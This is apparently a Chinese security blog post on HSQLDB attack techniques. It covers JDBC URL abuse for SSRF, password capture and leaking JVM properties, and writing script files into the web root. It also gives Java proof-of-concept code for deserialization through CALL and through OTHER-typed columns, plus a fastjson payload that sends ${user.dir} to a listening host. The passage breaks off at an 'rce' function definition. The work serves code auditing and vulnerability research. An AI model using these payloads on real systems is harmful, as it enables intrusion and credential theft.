# 1\. 背景
HSQLDB(HyperSQL DataBase)
是一个完全由Java编写的小型嵌入式数据库，因为它可以以文件或者内存的形式运行，不需要单独另起服务器，HSQLDB 也是一个服务器+客户端一体的 jar
包，HSQLDB 内置了 HTTP 和 HSQL 两种协议的服务器，通过命令行就可以启动 HSQLDB 服务器，除此之外 HSQLDB 还带了一个
Servlet 类`org.hsqldb.server.Servlet`可以注册到 Tomcat 中使用。
在我开发的工具”溯光“中就使用它来存储数据，我在之前做过的几个代码审计项目中也找过与其相关的一些漏洞。所以下文我会分享一些 HSQLDB
相关的一些测试方法。
HSQLDB 有四种连接模式。
  1. 内存模式：直接将数据存储在JVM的内存，数据会随着JVM的结束而消失。
  2. 文件模式：会将数据以文件形式存储在指定的某个目录下。
  3. WEB服务器模式：连接hsqldb的http端口
  4. HSQL服务器模式：连接hsqldb的hsql端口
对应的 jdbc url 分别如下
  1. jdbc:hsqldb:mem:myDbName
  2. jdbc:hsqldb:file:/opt/db/myDbName
  3. jdbc:hsqldb:
  4. jdbc:hsqldb:hsql://localhost:9001/myDbName
还有一个是 res 模式，但这个不常用，就不提了。
# 2\. 关于调试
> 可以看到自己编译的类中，每个method中都有一个
> LineNumberTable，这个信息就是用于调试的信息，但是hsqldb中没有这个信息，所以是无法调试下断点的，hsqldb应该在编译时添加了某些参数或者使用了其他手段来去除这些信息。
> ——引用自《F5 BIG-IP hsqldb(CVE-2020-5902)漏洞踩坑分析》
所以要想调试可以通过 **Longofo** 给出的 [longofo/hsqldb-source](https://github.com/longofo/hsqldb-source) 编译后再进行调试，不过作者给出的是 1.8 版本的
hsqldb，如需调试高版本需要自行编译相应版本的 hsqldb ，本文演示所用到的版本为 2.5.1。
# 3\. JDBC URL
JDBC URL我认为可以单独拎出来讲一下，因为有一些场景可能允许自行构造 JDBC URL
来连接数据库，例如一些开发者平台可以填写数据源，其中包括JDBC URL，还有 fastjson 反序列化的一些 DataSource 类型的 gadget
也可以填写 JDBC URL。
我也在一些代码审计项目中发现了 hsqldb JDBC URL 导致的安全问题。
先模拟下第一个场景，描述如下
**有一个数据源修改功能，可以修改jdbc url、jdbc driver
class、数据库账号、数据库密码等信息，其中数据库密码在页面上是打码的，无法从页面和抓包直接查看。**
我的思路如下
### 3.1 SSRF+破解明文密码
由于 hsqldb 允许使用 http/https 的方式去连接服务器，所以可以进行无回显的 SSRF
探测，同时验证密码时也会把明文密码带入请求体，也就可以获得到页面中看不到的密码了。
### 3.2 获取JVM敏感变量
导致问题的代码在`org.hsqldb.DatabaseURL#parseURL`方法
这里取出 `${}`里的字符串作为参数从`System.getProperty`方法调取对应的`value`
也就是说 System.getProperties() 所有的信息都可以通过 http 的方式携带出去。
比如要截取`user.dir`
### 3.3 写SQL文件
前面两种如果不能出外网可能就无法利用，所以要想获取密码就得把SCRIPT文件写到 web 目录下。
前面提到 hsqldb 是支持文件模式的。
所以需要改一下 jdbc url
`jdbc:hsqldb:file:E:/source/java/hsqltest/target/hsqltest/test1`
连接后会在`E:/source/java/hsqltest/target/hsqltest/`目录下生成这几个文件，其中 SCRIPT 文件是数据库初始化的
SQL 脚本文件，包含了用户名与MD5加密后的密码，虽然MD5不能直接破解，但大部分常见的密码都已经被撞出来了。
因为文件被写到了 web 目录，所以可以直接访问 test1.script 文件就能得到密码 MD5。
再通过 SOMD5/CMD5 等平台即可查出明文
# 4\. 反序列化
### 4.1 参数恢复
前段时间 F5 BIG IP 爆出过一个漏洞，其中就用到了 hsqldb 的反序列化漏洞。
因为它的 hsqldb 版本是较低的 1.8 版本，在 Servlet 收到 CALL 命令 恢复参数对象时造成了反序列化。
关于 1.8 的这个反序列化我就不再复现了。相关资料可参考[《F5 BIG-IP
hsqldb(CVE-2020-5902)漏洞踩坑分析》](https://paper.seebug.org/1271/)
    public static void testLocal() throws IOException, ClassNotFoundException, SQLException {
            String url = "http://localhost:8080";
            String payload = Hex.encodeHexString(Files.readAllBytes(Paths.get("calc.ser")));
            System.out.println(payload);
            String dburl = "jdbc:hsqldb:" + url + "/hsqldb_war_exploded/hsqldb/";
            Class.forName("org.hsqldb.jdbcDriver");
            Connection connection = DriverManager.getConnection(dburl, "sa", "");
            Statement statement = connection.createStatement();
            statement.execute("call \"java.lang.System.setProperty\"('org.apache.commons.collections.enableUnsafeSerialization','true')");
            statement.execute("call \"org.hsqldb.util.ScriptTool.main\"('" + payload + "');");
        }
参照 POC 实质上就是 CALL 命令在调用 java 静态方法时遇到 HEX 参数会自动解码并将解码后的 bytes 直接通过
ObjectInputStream 反序列化回 Java 对象。
2.5.1 也同样存在参数恢复的反序列化漏洞，一开始我以为被修了，但经过研究发现还是可以通过调用方法的时候反序列化参数。
### 4.2 图形化客户端
上面这种是由客户端请求服务端的。
由 HSQLDB 图形化客户端请求恶意服务端造成的反序列化漏洞，但有点鸡肋，不像 Mysql driver
反序列化那样连接成功后自动进行反序列化，需要用到图形化客户端来连接才可以。
可以看到 org.hsqldb.types.JavaObjectData#getObject 方法有被
`org.hsqldb.jdbc.JDBCResultSet#getObject(int)`和`org.hsqldb.jdbc.JDBCCallableStatement#getObject(int)`用到。
这两个类也就是 jdbc 客户端的ResultSet和Statement类。
只要他们的 getObject 方法被调用到且该字段的值可控就可以造成反序列化。
我通过查阅官方文档和阅读代码得可以创建一个带有 OTHER 类型字段的表。
通过 INSERT 语句插入一条序列化对象，当图形化客户端查询到这条结果或者 Java 客户调用到 ResultSet / Statement 的
getObject 方法时便会触发反序列化。
首先应先创建一个表， 设置 obj 字段为 OTHER 类型。
    CREATE TABLE movies (director VARCHAR(30), obj OTHER)
然后通过如下代码插入一条反序列化 payload 到这个表。
    String dburl = "jdbc:hsqldb:http://127.0.0.1/";
            Class.forName("org.hsqldb.jdbc.JDBCDriver");
            Connection connection = DriverManager.getConnection(dburl, "sa", "");
            connection.prepareStatement("CREATE TABLE movies (director VARCHAR(30), obj OTHER)").executeUpdate();
            PreparedStatement preparedStatement = connection.prepareStatement("insert INTO MOVIES values(?,?)");
            Object calc = new JRMPClient().getObject("127.0.0.1:2333");
            String s = "a" + System.currentTimeMillis();
            preparedStatement.setString(1,"a"+System.currentTimeMillis());
            preparedStatement.setObject(2,calc);
            System.out.println(preparedStatement.executeUpdate());
当我再用 HSQLDB 图形化客户端去连接这个数据库并且查询 movies 表时就会自动触发反序列化。
### 4.3 DataSource gadget
在 fastjson 开启了 autotype 且没有可用的 rce gadget 的场景下可以用到。
    {"@type":"org.hsqldb.jdbc.pool.JDBCPooledDataSource","url":"jdbc:hsqldb:http://127.0.0.1:2333/?${user.dir}","user":"sa","password":"","a":{"$ref":"$.pooledConnection"}}
实际上就是用 hsqldb 的 `org.hsqldb.jdbc.pool.JDBCPooledDataSource` 来连接指定 jdbc url 的
hsqldb 数据库。
# 5\. 高危SQL命令
### 5.1 方法调用
根据我的测试结果来看有三种方式可以来调用 JAVA 方法。
**第一种：自定义函数**
    create function rce(VARCHAR(80))